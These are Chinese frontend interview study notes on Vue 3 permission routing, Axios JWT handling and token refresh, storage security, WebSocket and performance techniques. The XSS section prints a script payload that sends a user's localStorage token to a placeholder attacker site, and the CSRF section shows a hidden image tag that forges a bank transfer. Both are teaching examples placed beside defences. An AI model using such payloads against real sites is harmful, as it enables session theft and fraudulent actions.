# RBAC

## 1. 核心模型：RBAC (Role-Based Access Control)

**原理描述**： 权限不直接分配给用户，而是通过“角色”作为中转桥梁。

- **关系表**：用户 ↔ 角色 (Many-to-Many，一个用户可以有多种角色)，角色 ↔ 权限 (Many-to-Many，一个角色可以有多种权限)。

- **本项目实现**：

  **数据库层**：通常包含 `sys_user`（用户表）、`sys_role`（角色表）、`sys_menu`（权限/菜单表）以及两张中间关系表。

  **数据下发**：用户登录后，后端返回该用户关联角色的 `menus` 权限标识数组。

  **前端执行**：

  - **页面级**：通过 `router.addRoute()` 动态加载角色对应的路由表。
  - **按钮级**：通过自定义指令（如 `v-permission`）判断当前角色是否拥有操作权限。

------

## 2. 技术实现方案：动态路由 (Dynamic Routing)

这是该点的核心。项目采用的是 **“前端配置全量异步路由 + 后端下发权限标识”** 的方案。

### A. 全局导航守卫拦截 (permission.js)

1. **外层逻辑**：判断是否有 Token。如果没有且不在白名单 (`whiteList`)，重定向至登录页。
2. 内层逻辑：
   - 检查 Pinia 中是否有用户信息。
   - **首次刷新/登录后**：调用 getInfo() 获取用户详细资料（含 `roles.menus`）。
   - **路由过滤**：对比全量异步路由表 `asyncRoutes` 和后端返回的权限标识数组。
   - **动态注入**：调用 `router.addRoute()` 将匹配成功的路由逐个注入。
   - **特殊处理**：动态添加 404 捕获路由 (`pathMatch`)，必须放在动态路由注入的最后，否则会提前命中。

### B. 关键代码细节(Permission.js)

#### 情况 A：用户已登录 (存在 Token)

1. **去登录页**：如果用户已经带 Token 访问 `/login`，会强制跳转回首页 (`next('/')`)，因为没必要重新登录。
2. 去其他页面：
   - **已有用户信息**：直接放行 (`next()`)。
   - 无用户信息 (刷新页面或首次加载)：
     - 调用 getInfo() 从后端获取最新资料。
     - **权限过滤**：从后端返回的 `res.roles.menus` 中拿到菜单列表，对比前端的全量动态路由表 `asyncRoutes`。
     - **动态挂载**：使用 `router.addRoute(route)` 将筛选出的有权限路由注入到路由系统中。
     - **404 兜底**：必须在所有动态路由挂载后，最后添加 404 捕获路由 (`pathMatch(.*)*`)。
     - **重定向跳转**：使用 `next({ ...to, replace: true })` 重新触发一次路由进入，确保新挂载的路由已经生效。

#### 情况 B：用户未登录 (无 Token)

1. **在白名单内**：直接放行。
2. **不在白名单**：重定向到登录页，并带上 `redirect` 参数（以便登录后能跳回刚才想去的页面）。

- router.addRoute(route)**：Vue Router 4 的 API。

- `next({ ...to, replace: true })`：这是一个极其关键的操作。

  当 `addRoute` 发生时，新的路由表还未生效。

  - 如果直接 `next()`，此时 to 路径可能还没在路由表里（因为 `addRoute` 是异步挂载的），会导致匹配到 404 或白屏。使用带有目标地址的 `next` 会中断当前导航并触发一次新的导航，此时新路由表已生效。

## 3. 问题 (Q&A)

### Q1: 为什么不在 router/index.js 里写死所有路由，然后用 `v-if` 隐藏菜单？

- **回答**：这属于“伪权限”。虽然 UI 隐藏了，但用户手动在地址栏输入 URL 仍能访问。真正的权限方案必须配合动态路由，确保无权限的路由在路由表中物理不存在，且通过导航守卫拦截。

### Q2: 页面刷新后，动态添加的路由为什么会丢失？怎么处理？

- **回答**：路由实例存在内存中，刷新后会重置。我们在 permission.js 的 `beforeEach` 中做了守卫。刷新时通过判断 Store 中是否存在用户信息（或角色信息），如果不存在，则重新拉取并重执行 `addRoute` 逻辑。

### Q3: 为什么 404 路由要动态添加？

- **回答**：在初始化路由表时，通配符 404 路由必须放在所有路由的最末尾。由于我们的业务路由是根据用户权限异步生成的，如果 404 放在静态路由中，它会比动态路由先进入路由表，导致在动态路由还没挂载完成前，所有非法（或尚未挂载）的路径都会被 404 拦截。因此，我们必须在 `addRoute` 逻辑的**最后一行**，再动态添加 404 捕获路由，以确保它的匹配优先级是最低的。

## 4. 相关知识点

### 指令钩子函数对比 

| 钩子名称      | 触发时机                                         | 权限场景用途                                   |
| ------------- | ------------------------------------------------ | ---------------------------------------------- |
| `created`     | 在绑定元素的属性或事件监听器被应用之前调用       | 极少使用                                       |
| `beforeMount` | 指令第一次绑定到元素并且在挂载到父组件之前       | 此时拿不到父节点，无法删除元素                 |
| **mounted**   | **元素已插入父节点，DOM 已就绪**                 | **最适合权限删除逻辑，因为可以安全操作父节点** |
| `updated`     | 在包含组件的 VNode 及其子组件的 VNode 更新后调用 | 适合根据动态数据（如变量改）重新判断权限       |
| beforeUnmount | 绑定元素的父组件卸载前调用。                     | 清理资源。                                     |
| unmounted     | 绑定元素的父组件卸载后调用。                     | 最终清理。                                     |

**总结：** 注册时通过 `app.directive`；使用 `mounted` 是因为它保证了元素已经“脚踏实地”地站在了 DOM 树里，你可以安全地通过它的父亲（`parentNode`）把它“踢出去”。

## 2. 请求拦截器：JWT 自动注入 (Bearer Token)

**原理**：在请求发出前，利用拦截器统一从本地存储（Store 或 Cookies）中读取 Token，并按照 OAuth 2.0 标准规范（Bearer 规范）注入 HTTP Header。

**代码逻辑**：

```js
service.interceptors.request.use(config => {
  const token = dispatch.user.getToken() // 从 Pinia 获取 Token
  if (token) {
    config.headers.Authorization = `Bearer ${token}` // 注意空格
  }
  return config
}, error => Promise.reject(error))
```

**为什么自动注入：**

1. **避免重复代码**
2. **统一管理认证逻辑**
   - 集中处理 Token 获取方式
   - 统一 Token 格式（Bearer 方案）
   - 便于维护和修改
3. **安全性考虑**
   - 避免 Token 泄露（不在 URL 中传递）
   - 统一过期处理
   - 便于添加加密逻辑

## 4. Token 过期与无感登出

### A. 401 被动登出

**原理**：当后端检测到 Token 过期或非法时，会返回 HTTP 401 状态码。前端在响应拦截器中捕获此错误。 

**处理流程**：

1. 捕获 401 状态码。

2. 调用 Store 的 logout 方法（清除本地 Token、重置用户信息）。

3. 使用 `router.push('/login')` 强制跳转回登录页。

4. 记录当前页面路径，作为 `redirect` 参数传给登录页，实现“重新登录后原样跳回”。

   ```js
   async error => {
     if(error.response && error.response.status === 401){
       await dispatch.user.logout()
       router.push('/account/login') // 被动回滚
       return Promise.reject(error)
     }
   }
   ```

### B. 无感延时机制 

**知识点**：

- **无感刷新 (Silent Refresh)：**用户的 Access Token（访问令牌）过期时，系统自动使用 Refresh Token（刷新令牌）在后台获取新的 Access Token，整个过程对用户完全透明，用户不会感觉到任何中断，也不需要重新登录。

- **安全性保障**：通过 Axios 统一管理，确保了没有任何 API 泄露能绕过鉴权，实现了“不登录、不发券、不入场”。

  ![77375516668](C:\Users\ADMINI~1\AppData\Local\Temp\1773755166683.png)

```js
import axios from 'axios';

// 假设这些是你封装好的本地存储操作方法
import { getToken, setToken, getRefreshToken, clearTokens } from './auth';

// 1. 创建 Axios 实例
const apiClient = axios.create({
  baseURL: 'https://api.example.com',
  timeout: 10000,
});

// 是否正在刷新 Token 的标记（锁）
let isRefreshing = false;

// 重试队列：保存需要等待刷新完成后才能继续执行的请求
let requests = [];

// ==========================================
// 请求拦截器：每次发送请求前，自动挂载 Access Token
// ==========================================
apiClient.interceptors.request.use(
  (config) => {
    const token = getToken();
    if (token) {
      config.headers['Authorization'] = `Bearer ${token}`;
    }
    return config;
  },
  (error) => Promise.reject(error)
);

// ==========================================
// 响应拦截器：核心逻辑，拦截 401 并静默刷新
// ==========================================
apiClient.interceptors.response.use(
  (response) => {
    // HTTP 状态码 2xx，请求成功，直接返回数据
    return response;
  },
  async (error) => {
    const originalRequest = error.config;

    // 判断是否是 401 未授权错误，并且该请求还没有被重试过 (_retry 是自定义标记)
    if (error.response && error.response.status === 401 && !originalRequest._retry) {
      
      if (!isRefreshing) {
        // 第一种情况：当前没有在刷新 Token，由这个请求触发刷新流程
        isRefreshing = true;
        originalRequest._retry = true; // 标记该请求已重试，防止死循环

        try {
          const refreshToken = getRefreshToken();
          // 注意：这里必须使用原生的 axios 发送请求，千万不要用 apiClient！
          // 否则刷新接口一旦也报错 401，就会进入无限循环死锁。
          const res = await axios.post('https://api.example.com/auth/refresh', {
            token: refreshToken
          });

          const newToken = res.data.accessToken;
          setToken(newToken); // 将新 Token 保存到本地

          // 核心步骤 1：释放队列。按顺序执行之前被挂起的请求，并传入新 Token
          requests.forEach((callback) => callback(newToken));
          requests = []; // 清空队列

          // 核心步骤 2：重新发送当前这个触发刷新的失败请求
          originalRequest.headers['Authorization'] = `Bearer ${newToken}`;
          return apiClient(originalRequest);

        } catch (refreshError) {
          // 最坏的情况：Refresh Token 也过期了，或者被服务端拉黑了
          clearTokens(); // 清除本地所有的登录凭证
          
          // 强制重定向到登录页，让用户重新登录
          window.location.href = '/login';
          return Promise.reject(refreshError);
          
        } finally {
          // 无论刷新成功还是失败，最后都必须释放锁
          isRefreshing = false;
        }
        
      } else {
        // 第二种情况：Token 正在刷新中。
        // 此时又来了其他的 401 请求，我们把这些请求的 resolve 函数存入队列
        return new Promise((resolve) => {
          requests.push((newToken) => {
            // 当刷新成功后，上面的 forEach 会遍历执行这里的代码
            originalRequest.headers['Authorization'] = `Bearer ${newToken}`;
            resolve(apiClient(originalRequest));
          });
        });
      }
    }

    // 如果不是 401 错误，或者已经重试过了，直接抛出错误交给业务层处理
    return Promise.reject(error);
  }
);

export default apiClient;
```



## 5. 面试官高频问答 (Q&A)

### Q1: 为什么要对 Axios 进行二次封装？直接引 Axios 不行吗？

- 回答：封装是为了解耦和统一规范。
  1. 统一设置 `baseURL`，方便在 `dev` / `test` / `prod` 环境间切换。
  2. 统一处理 Token 注入，避免在每个 API 里手动写 Header。
  3. 统一处理异常，如 401 自动跳转，不需要在每个组件里写相同的 `catch` 逻辑。

### Q2: 如何处理多个请求同时失败时的 401 报错？

- 进阶回答

  （如果你想展示深度）：我们会引入一个isRefreshing的开关。

  - 第一个 401 回来时，开启开关并执行登出或刷新。
  - 后续的 401 请求进入时，将其放入一个队列中挂起。
  - 等第一个请求刷出新 Token 后，再重发队列里的请求。

### Q3: 为什么文件下载要特殊处理？

- **回答**： Axios 默认把返回体当做 JSON 解析。文件导出返回的是二进制流（Blob）。如果不加 `responseType: 'blob'` 且不进行拦截器豁免，Axios 会尝试用 JSON 解析二进制流，导致报错。

## 知识点

### JWT

**定义：JWT** (JSON Web Token) 是一种用于在网络上安全传递信息的开放标准。在你的项目中，它是用来做**身份认证**（证明你是谁）和**信息交换**的。

简单来说，JWT 就像是服务器给用户发的一张“**数字化临时通行证**”。

------

**结构：**一个 JWT 字符串由 `.` 分成三个部分：`Header.Payload.Signature`（头部.负载.签名）。

- **Header (头部)**：声明类型（JWT）和加密算法（如 HS256）。
- **Payload (负载)**：存放实际的数据。比如用户 ID (userId)、用户名、过期时间等。
  - *注意：这部分是 Base64 编码的，不是加密的，所以敏感信息（如密码）绝对不能放在这里。*
- **Signature (签名)**：这是最关键的部分。服务器通过一个**只有自己知道的密钥**，对前两部分进行哈希计算。这样就能保证 Token 没有被篡改。

------

JWT 的工作流程（在你的项目中是如何运行的）？

1. **登录**：用户在登录页输入账号密码，发送给后端。

2. **生成**：后端验证成功后，通过密钥生成一个 JWT 字符串并发给前端。

   ![77340499480](C:\Users\ADMINI~1\AppData\Local\Temp\1773404994809.png)

3. **存储**：前端（你在 user.js 的 setToken 里）把这个 Token 存入 **Cookies** 或 **LocalStorage**。

4. **携带：**之后前端发起的每一次API 请求（你在request.js的请求拦截器里），都会在 Header 里的Authorization字段带上这个 Token。

   - 格式：`Bearer <token>`

5. **验证**：后端收到请求后，用手中的密钥尝试解密/验证签名。如果验证通过且没过期，就处理请求。

------

JWT 为什么好？

- **无状态 (Stateless)**：这是它最大的优点。服务器不需要在数据库或 Session 里存储 Token 的信息。只要签名是对的，服务器就信任它。这使得服务器非常容易水平扩展（集群部署）。
- **自包含 (Self-contained)**：Token 里已经包含了用户的部分基本信息，减少了查询数据库的次数。
- **跨域友好**：因为它存在 Header 里，不像 Cookie 那样受到严格的跨站限制。

------

### Bearer Token

**Bearer** 这个单词的字面意思就是“**持有者**”或“**持票人**”， 是 HTTP 认证的一种方式，在请求头中使用 `Authorization: Bearer <token>` 格式传递令牌。

在 Web 开发和接口鉴权中，**Bearer Token** 是一种特殊的身份验证方案，它的核心含义是：**“只要谁持有这个令牌（Token），谁就有权限访问相应的资源。”**

- **认证类型**：我要使用的验证方式是 Bearer（持有者验证）。
- **区分其他方式**：除了 Bearer，还有其他的验证方式，比如 `Basic`（传账号密码）、`Digest`（摘要认证）等。

如果不加 `Bearer `，服务器可能不知道该如何解析你后面跟着的那串乱码。

由于它是“持票即通行”，所以它面临一个巨大的安全问题：**如果 Token 被人偷走了，别人就能立刻冒充你。**所以，使用 Bearer Token 有两个必要前提：

1. **必须使用 HTTPS**：防止 Token 在传输过程中被黑客截获（抓包）。

2. **设置有效期**：Token 不能永久有效，一旦泄露，损失也是有限的。

   设置 Token 有效期通常从三个层面来实现：**后端签发时设置**、**前端存储时控制** 以及 **业务逻辑主动校验**。

### Cookies 或 LocalStorage

1. 核心对比表

| 特性             | Cookie                                | LocalStorage                          |
| ---------------- | ------------------------------------- | ------------------------------------- |
| **存储容量**     | 很小 (约 **4KB**)                     | 较大 (**5MB - 10MB**)                 |
| **生命周期**     | 可设置过期时间（默认关闭浏览器失效）  | **永久存储**，除非手动删除            |
| **与服务器交互** | **自动携带**在 HTTP 请求头中          | **不会自动发送**，需代码手动读取      |
| **读写操作**     | 服务器和前端都能读写                  | 只能由前端 JS 读写                    |
| **作用域**       | 随 Domain/Path 锁定，可实现跨子域共享 | 严格遵守**同源策略** (协议+域名+端口) |

------

2. **“Token 应该存哪里更安全？”**

**场景 A：存在 Cookie 中**

- **优点**：可以设置 `HttpOnly` 属性。设置后，JS 脚本无法读取该 Cookie。
- **安全防御**：能极大地抵御 **XSS 攻击**（黑客无法通过脚本偷走你的 Token）。
- **缺点**：容易受到 **CSRF（跨站请求伪造）攻击**，因为浏览器会自动带上 Cookie 发送请求。

**场景 B：存在 LocalStorage 中（你的项目目前的选择）**

- **优点**：操作超简单 (`setItem`, `getItem`)，完全由前端控制，天然免疫 CSRF 攻击。
- **缺点**：非常容易受到 **XSS 攻击**。如果页面被注入了恶意脚本，对方可以通过 `localStorage.getItem` 瞬间拿走你的 Token。

------

### XSS 攻击、CSRF（跨站请求伪造）

1. **XSS (Cross-Site Scripting) - 跨站脚本攻击**

   **核心：代码注入。** 黑客把恶意的 JavaScript 脚本注入到你的网页中，当其他用户浏览该网页时，这些脚本就会隐蔽地执行。

- **他是怎么攻击的？ (举例)** 你在一个论坛发了条评论：“这个网站真不错！”。 黑客发了条评论：`<script>window.location='http://黑客网站?token=' + localStorage.getItem('token')</script>`。 如果你这个网站没做防御，直接把评论渲染到了页面上。那么**每一个**看到这条评论的用户，他们的 Token 都会被自动发送给黑客。

- **攻击目的**：

  - 偷走 Cookie 或 LocalStorage 里的 Token。
  - 监听用户操作（如键盘记录）。
  - 修改页面内容（比如把登录框指向黑客的后台）。

- **如何防御？**

  - **转义 (Escape)**：把 `<` 变成 `&lt;`，把 `>` 变成 `&gt;`。Vue 等现代框架默认就做了这件事。

  - **不要用 v-html**：除非内容完全可信。

  - **HttpOnly Cookie**：让 JS 脚本无法读取 Cookie。

  - **CSP (内容安全策略)**：告诉浏览器只允许执行来自特定信任域名的脚本。

    （可以把CSP理解为一份交给浏览器的**“白名单”**，明确告诉浏览器：**“只准加载我允许的资源，其他的统统拦截。）

2. **CSRF (Cross-Site Request Forgery) - 跨站请求伪造**

   **核心：借刀杀人。** 黑客并不获取你的权限，而是利用你 **“已经登录”** 的状态，诱骗浏览器去发送一个你不知情的请求。

- **它是怎么攻击的？ (举例)**
  1. 你刚刚登录过网上银行 `bank.com`，且 Cookie 还没过期。
  2. 你在同一个浏览器里，不小心点开了一个黑客制作的钓鱼网站。
  3. 那个网站里有个隐藏的图片：`<img src="http://bank.com/transfer?to=黑客&amount=10000">`。
  4. 浏览器在加载这个图片时，会**自动带上**你 bank.com 的 Cookie 发送请求。
  5. 银行服务器检查 Cookie 发现真的是你，于是在你不知情的情况下完成了转账。
- **攻击目的**：
  - 利用用户的身份执行非法操作（转账、发帖、改密码等）。
- **如何防御？**
  - **使用自定义 Header (JWT 的做法)**：黑客可以诱导浏览器发请求带上 Cookie，但他没法诱导浏览器在 Header 里加上 `Authorization` 字段。这就是为什么你的项目里手动注入 Token 能防御 CSRF。
  - **Anti-CSRF Token**：服务器给表单发一个随机 Token，提交时必须带上。
  - **SameSite Cookie 属性**：设置为 `Strict` 或 `Lax`，禁止浏览器在跨站请求时携带 Cookie。

# 实时通信

## 1.什么是WebSocket

定义：WebSocket 是一种在单个 TCP 连接上进行**全双工通信**的协议，它允许服务器主动向客户端推送数据。

为什么不用传统的http？

**传统 HTTP 的痛点（轮询 Polling）：** HTTP 是“请求-响应”模式。如果前端想知道有没有新消息，必须每隔几秒钟向服务器问一次（“有新消息吗？”）。这就像你每隔 5 分钟给快递员打个电话问快递到了没。这会产生大量的无效请求，浪费服务器性能，且消息依然会有几秒的延迟。

**WebSocket 的破局：** WebSocket 就像你加了快递员的微信。你们建立联系后，只要快递一到，他会主动发消息给你。

```
// HTTP：单向请求-响应模式
客户端 → 请求 → 服务器
客户端 ← 响应 ← 服务器
// 每次通信都需要重新建立连接

// WebSocket：双向实时通信
客户端 ←→ 连接建立后双向通信 ←→ 服务器
// 一次连接，持续通信
```

连接生命周期：

```
客户端                    服务器
  |                         |
  |—— HTTP 握手请求 ————————→|
  |←—— 101 状态码 ——————————|
  |—— 连接建立成功 —————————→|
  |←—— 双向数据传输 ————————→|
  |—— 关闭连接 ————————————→|
  |←—— 关闭确认 ————————————|
```

## 面试问题

### 1.后端是如何处理连接的？

后端处理 WebSocket 连接主要分为两步。第一步是**协议升级**，接收前端带 `Upgrade` 头的 HTTP GET 请求，校验通过后返回 101 状态码，保持底层的 TCP 连接不断开。第二步是**状态管理**，在建立连接时解析 URL 中的 Token 完成用户身份校验，并将‘用户 ID’与‘WebSocket 会话对象’映射存储在内存字典（Map）中，同时挂载该对象的 `onMessage` 和 `onClose` 监听器，以便后续的精准消息推送和断开时的内存回收

### 2. 前端是怎么对 WebSocket 进行工程化封装的？

- **面试官的真实意图：** 考察你的全局视野，看你是否知道为什么不能在每个页面都 `new WebSocket()`。

- **高分回答套路（强调设计模式）：**

  > 为了解决这些痛点，我从零重构了底层的通信模块：

  > 1. **采用单例模式（Singleton）：** 保证全局只维护一根长连接，节省资源。并且通过状态锁（检查 `readyState`）防止了快速切换页面导致的并发建连。

**Q1: 为什么要弃用 Iconfont 转而使用 SVG 雪碧图？**

## 四、 知识点

### SCSS与CSS

| **特性**     | **CSS (原生)**                                               | **SCSS (预处理器)**                                          |
| ------------ | ------------------------------------------------------------ | ------------------------------------------------------------ |
| **运行环境** | 浏览器（运行时解析）                                         | 构建工具（编译时解析）                                       |
| **变量类型** | CSS 自定义属性 (`--color: red;`)，**支持**在浏览器中用 JS 动态修改。 | SCSS 变量 (`$color: red;`)，编译后变成写死的固定值，**无法**动态修改。 |
| **嵌套规则** | 现代浏览器刚开始原生支持，但老版本不兼容，通常较少直接写深层嵌套。 | 完美支持层级嵌套，代码结构与 HTML 对应，阅读极度清晰。       |
| **代码复用** | 较弱（主要靠提取公共类名）。                                 | 极强（通过 `@mixin`、`@extend` 和函数实现高度复用）。        |
| **逻辑运算** | 仅支持简单的数学运算 (`calc()`)。                            | 支持 `if/else`、`for` 循环、复杂的颜色计算（如 `darken()` 加深颜色）。 |

**SCSS 变量的局限性：它是“编译时”的静态产物**

- **原理：** SCSS（例如 `$bg-color: #ffffff;`）是一种 CSS 预处理器。它的工作主要发生在你的本地开发和打包阶段（比如你运行 Vite 或 Webpack 时）。
- **结果：** 打包完成后，所有的 SCSS 变量都会被“翻译”成写死的静态固定值。浏览器最终拿到的代码里只有确定的色值（`#ffffff`），根本不存在 `$bg-color` 这个东西。
- **致命点：** 因为在代码发送到浏览器之前，SCSS 变量就已经变成了死代码，所以当用户在网页上点击“深色模式”按钮时，你**无法**通过 JavaScript 动态去改变一个 SCSS 变量的值。

**CSS 变量的优势：它是“运行时”的动态属性**

- **原理：** 现代原生的 CSS 自定义属性（例如 `--bg-color: #ffffff;`）是浏览器原生理解并支持的规范。
- **结果：** 它存活在用户的浏览器中，并且具有作用域的概念（可以通过改变父元素的类名来影响子元素）。
- **优势：** 当你通过 JavaScript 改变 `<html>` 或 `<body>` 的属性（比如加上 `data-theme="dark"`）时，浏览器会实时重新计算并应用新的 CSS 变量值，从而实现页面颜色的瞬间切换。

# 现代化网络

## 一、 为什么引入 MSW 替代传统的 Mock.js？

- 传统 Mock.js 的痛点：
  - **拦截原理缺陷**：Mock.js 是通过重写原生的 `XMLHttpRequest`（或覆写 fetch）来实现拦截的。这意味着你在 Chrome Network（网络面板）中**根本看不到发出的请求**，导致调试非常痛苦。
  - **破坏原生行为**：容易与 Axios、Fetch 等现代网络库产生兼容性冲突，甚至会改变原本期望的数据流（如 Blob 处理）。
- MSW (Mock Service Worker) 的优势：
  - **浏览器底层拦截**：利用了 HTML5 的 Service Worker 技术，在**网络层**（Network Layer）拦截请求。
  - **真实的请求可见**：拦截发生后，依然会在浏览器的 Network 面板展示完整的请求（标有 "⚙️" 齿轮标志），对开发者完全透明，调试体验绝佳。
  - **零成本切换**：代码里用的就是真实的 `fetch` 或 `axios` 调用逻辑，不需要为了 Mock 去改写业务代码。

## 五、知识点

### 生产环境与开发环境

**1. 核心定义：它们到底是给谁用的？**

*   **开发环境 (dev)**：是给**程序员**用的。通常运行在你的本地电脑上（`npm run dev`），比如 `http://localhost:xxxx`。它的核心追求是：**开发体验好、调试方便、看到修改能马上生效。**
*   **生产环境 (prod)**：是给**真实用户**用的。代码经过打包后（`npm run build`），部署到了云服务器或者 CDN 上（比如 `https://www.yourdomain.com`）。它的核心追求是：**体积小、加载快、运行稳定安全。**

---

**2. 两者在代码底层的具体区别**

在项目中，构建工具（Vite）会根据当前的环境应用完全不同的处理策略：

① 代码体积与可读性

*   **开发环境**：代码**不压缩、不混淆**，保留了完整的注释和详细的错误提示。更重要的是，保留了 SourceMap（源码映射），当你代码报错时，浏览器控制台能准确指出是你写的 `Vue` 文件第几行报的错。
*   **生产环境**：代码会被极度**压缩（Minification）和混淆（Obfuscation）**。所有的变量名会被替换成 `a`, `b` 这种单字母，去掉空格和注释，目的是把 JS 和 CSS 文件的体积压缩到最小，让用户秒开网页。同时会去掉控制台的 `console.log`。

② 数据驱动（引出你简历上的亮点）

*   **开发环境**：后端接口往往还没开发完。此时就像你代码里写的 `import.meta.env.MODE === 'development'`，项目会**启动 MSW 拦截**，加载 Faker.js 自动生成大量模拟数据，让你不需要等后端就能把所有的 UI 状态提早开发完毕。
*   **生产环境**：用户使用的是真实的数据库数据。打包时（`npm run build`），构建工具检测到不是 development，**MSW 和 Faker 等测试代码会被直接剔除（Tree-shaking）**，你的代码会自动去连接真实的线上服务器（比如 `https://api.youlai.tech`）。

③ 运行机制与性能

*   **开发环境**：Vite 启动了一个本地的 Node.js 开发服务器。它支持 **HMR（热更新）**，你按一下 `Ctrl+S` 保存代码，浏览器页面不用刷新，改掉的样式瞬间生效。
*   **生产环境**：你最终通过 `vite build` 产出的是一个 `dist` 文件夹，里面全是纯粹的静态文件 (`.html`, [.js](cci:7://file:///e:/Work/qianduan/%E4%BA%BA%E5%8A%9B%E8%B5%84%E6%BA%90/vue3-hr/src/main.js:0:0-0:0), `.css`)。线上服务器（如 Nginx）只负责提供这些静态文件的下载，不会有热更新的功能。

## 2.首屏与列表加载体验

### 🚀 路由懒加载 (Route Lazy Loading)

- **为什么要懒加载？**

  在默认情况下，像 Webpack 或 Vite 这样的打包工具，会把项目里所有的 Vue 组件（无论是首页还是藏在深处的设置页）全部打包进一个巨大的 app.js 文件中。当用户第一次打开网站时，必须等这个巨大的 JS 文件全部下载并解析完，页面才能渲染。这就导致了严重的**“首屏加载缓慢”和“白屏时间过长”**。

- **懒加载的原理**：

  路由懒加载的核心底层技术是 **ES6 的动态导入语法** `component: () => import(...)`
  当打包工具（Webpack/Rollup）遇到 `import()` 时，它会聪明地将这部分代码单独切割出来，打包成一个个独立的、体积很小的 `chunk.js` 文件。
  **结果：** 用户访问首页时，浏览器只下载“公共依赖”和“首页组件”的代码。只有当用户点击菜单切换到“用户管理”页面时，浏览器才会发起 HTTP 请求，去即时下载“用户管理”对应的 `chunk.js`。

  ![77407411794](C:\Users\ADMINI~1\AppData\Local\Temp\1774074117941.png)

- **面试解释**: “通过将每个页面组件打包成独立的 Chunk，只有在使用到该路由时才加载对应的代码块。这显著减少了首屏 JavaScript 的体积，将初始加载压力分散到各个路由跳转中。”

### 🖼️ 图片资源懒加载

- **核心原理：什么是图片懒加载？**

  - **痛点：** 传统的网页加载时，浏览器会去请求 HTML 中所有的 `<img>` 资源的 `src` 属性。如果一个长列表页面有 100 张高清大图，会瞬间发出 100 个 HTTP 请求，占用大量带宽，导致首屏的核心内容（如文字、首屏的主图）被阻塞，用户看到的就是长时间的白屏。
  - **懒加载原理：** 初始状态下，不给 `<img>` 标签设置真实的 `src`（或者设为一个极小的占位图 / Base64），而是将真实的图片链接存放在一个自定义属性中（例如 `data-src`）。只有当用户向下滚动，**图片即将进入浏览器的可视区域（Viewport）时**，才通过 JavaScript 将 `data-src` 的值动态赋值给 `src`，触发图片的真实网络请求。

## 4.知识点

### `<keep-alive>` 的底层原理

**1. 核心引擎：**

- **VNode 缓存机制：** 默认情况下，Vue 在切换组件时会销毁（Unmount）旧组件并重新创建（Mount）新组件。而 `<keep-alive>` 是 Vue 的一个内置抽象组件，它自身不会渲染成真正的 DOM 元素。它的工作原理是将内部包裹的组件的 VNode（虚拟 DOM 节点）及其对应的实例**缓存在内存中**，而不是直接销毁。
- **状态保留：** 因为组件实例依然存在于内存中，所以组件内部的 `ref`、`reactive` 数据（比如你填了一半的表单数据、页面的滚动条位置）都会原封不动地保留下来。当你再次切换回这个标签页时，Vue 会直接从缓存中取出实例并挂载，这就实现了“表单状态回显”。
- **生命周期的改变：** 被 `<keep-alive>` 缓存的组件会丧失正常的 `mounted` 和 `unmounted` 触发时机（它们只在第一次创建和最终销毁时触发）。取而代之的是，Vue 提供了两个专属生命周期钩子：
  - `activated`：组件从缓存中被激活、重新插入 DOM 时触发。
  - `deactivated`：组件被移除 DOM 并放入缓存时触发。

**2. 桥梁枢纽：Vue Router 与 `<keep-alive>` 的结合**

在 Vue 3 中，路由视图与缓存的结合方式发生了变化，这也是面试常考的代码规范点。

- **Vue 3 的新语法 (v-slot)：** 不能再像 Vue 2 那样把 `<router-view>` 直接塞进 `<keep-alive>` 里。必须使用作用域插槽和动态组件 `<component>`：

  ```js
  <router-view v-slot="{ Component, route }">
    <keep-alive :include="cachedViews">
      <component :is="Component" :key="route.path" />
    </keep-alive>
  </router-view>
  ```

**3. 动态调度：多标签页 (Tabs) 的状态管理机制**

“多标签页”不仅要求能缓存，还要求能**动态清除缓存**（比如用户点击了标签上的 `x` 关闭页面）。这通常需要结合 Pinia（或 Vuex）来实现。

- **include 属性的精确控制：** `<keep-alive>` 接受一个 `include` 属性（通常绑定一个数组 `cachedViews`，里面存的是组件的 `name` 字符串）。只有名称匹配的组件才会被缓存。
- **交互逻辑闭环：**
  1. **打开新标签：** 监听路由变化，将新路由的组件 `name` `push` 到 Pinia 的 `cachedViews` 数组中，组件开始被缓存。
  2. **切换标签：** 路由改变，但因为之前的 `name` 还在 `cachedViews` 里，所以直接从内存读取，表单数据完美回显。
  3. **关闭标签：** 用户点击关闭按钮，触发 Pinia 的 Action，从 `cachedViews` 数组中剔除该组件的 `name`。此时 `<keep-alive>` 监测到变化，会自动销毁对应的组件实例，释放内存。

### 虚拟列表 (Virtual List / Virtual Scrolling)

**1. 痛点：十万条数据渲染直接卡死**在后台管理系统中，经常会遇到后端一次性返回几千甚至上万条数据的情况。如果前端把这上万条数据全部渲染成 DOM 节点（比如 `<li>` 或 `<tr>`），浏览器的内存会瞬间撑爆，页面在渲染时会发生长时间的卡顿甚至崩溃。

**2. 核心原理：只渲染“你看得见”的区域**虚拟列表的核心思想是：**无论数据有多少条，真正在 DOM 树里渲染的，永远只有用户当前可视区域内的那十几条（加上下缓冲区的几条）。**

**3. 底层实现机制（面试必考的计算逻辑）：**构建一个完美的虚拟列表，需要三个核心元素配合：

- **可视容器 (Viewport)：** 给列表的最外层包一个固定高度的 `div`，并设置 `overflow-y: auto`，用来产生滚动条。
- **幽灵撑高层 (Phantom)：** 在容器里放一个空的 `div`，它的总高度 = `所有数据总数 × 单条列表高度`。它的唯一作用是把滚动条“撑”到真实的长度，让用户感觉真的有十万条数据在里面。
- **真实渲染区 (List)：** 绝对定位在可视容器内部，真正用来循环渲染可见数据的区域。

**运行过程：**当用户往下滚动时，监听 `scroll` 事件：

1. 拿到当前滚动的距离 `scrollTop`。
2. 计算出当前应该从哪一条数据开始渲染：`startIndex = Math.floor(scrollTop / itemHeight)`。
3. 计算出当前可视区能放下几条数据：`visibleCount = Math.ceil(容器高度 / itemHeight)`。
4. 截取需要渲染的数据片段：`endIndex = startIndex + visibleCount`。
5. **关键一步：** 使用 CSS 的 `transform: translateY`，把“真实渲染区”往下平移到用户正好滚动到的位置，填补视觉空白。

**4. 高阶面试防坑（拉开差距的亮点）：**

- **面试官挖坑：** “如果你列表里的每一项高度不是固定的（比如有的只有一行字，有的有十行字），虚拟列表该怎么算？”
- **高分回答：** “这叫**不定高虚拟列表**。处理不定高比较复杂，我的方案是：先给所有项预设一个估算高度（Estimated Height）进行初步渲染。当列表项真实挂载到 DOM 后，利用 `ResizeObserver` 或者 `getBoundingClientRect` 获取它的真实高度，然后更新并缓存这个真实高度，重新计算整体高度和偏移量。这在类似微博信息流的场景中非常实用。”

### 防抖 (Debounce) 与 节流 (Throttle)

